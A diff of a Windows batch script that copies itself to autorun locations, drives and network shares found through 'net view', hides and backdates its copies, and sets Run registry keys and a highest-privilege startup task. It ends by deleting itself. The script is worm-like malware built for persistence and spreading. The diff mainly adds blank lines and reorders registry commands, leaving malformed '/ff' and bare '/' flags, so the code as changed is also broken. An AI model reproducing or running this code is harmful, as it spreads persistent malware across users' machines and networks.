@@ -103,6 +103,8 @@ reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons" /v
 
 
 
+
+
 if exist "%path_autoRun1%\%~nx0" (
   copy /y "%~dpnx0" "%path_autoRun1%\"
   attrib +r +s "%path_autoRun1%\%~nx0"
@@ -117,14 +119,16 @@ if not exist "%path_autoRun2%\%~nx0" (
 
 
 
+
+
 for %%i in (localAppData appData) do (
   if exist "!%%i!\%~nx0" (
     call attrib +r +s "!%%i!\%~nx0"
     (
       call %module_fileTouch% /w /a /c /d %app_date% "!%%i!\%~nx0"
-      call reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "!%%i!\%~nx0" /f
-      call reg add HKCU\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "!%%i!\%~nx0" /f
+      call reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "!%%i!\%~nx0" /ff
       call reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "!%%i!\%~nx0" /f
+      call reg add HKCU\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "!%%i!\%~nx0" /
       call reg add HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "!%%i!\%~nx0" /f
       call schtasks /create /sc onstart /tn "%app_name% %%i" /tr "!%%i!\%~nx0" /f /rl highest
     )>nul 2>nul
@@ -177,6 +181,8 @@ for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do if exist "%%
 )
 
 timeout /nobreak /t 5 >nul
+
+
 
 
 
@@ -243,6 +249,8 @@ if exist "%path_autoRun2%\%~nx0" (
 
 
 
+
+
 for %%i in (localAppData appData) do (
   if exist "!%%i!\%~nx0" (
     call attrib -h -r -s "!%%i!\%~nx0"
@@ -256,6 +264,8 @@ for %%i in (localAppData appData) do (
     )>nul 2>nul
   )
 )
+
+
 
 
 
@@ -286,6 +296,8 @@ for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do (
 
 
 
+
+
 for /f "skip=3 tokens=1,* delims= " %%i in ('net view') do if /i "%%i" NEQ "The" (
   for /f "skip=7 tokens=1,* delims= " %%j in ('net view %%i') do if /i "%%j" NEQ "The" (
     if exist "%%i\%%j\%~nx0" (
@@ -304,6 +316,10 @@ for /f "skip=3 tokens=1,* delims= " %%i in ('net view') do if /i "%%i" NEQ "The"
     )
   )
 )
+
+
+
+
 
 attrib -h -r -s "%~dpnx0"
 start /min "" cmd /c "timeout /t 5 && del /q """%~dpnx0""" && pause"
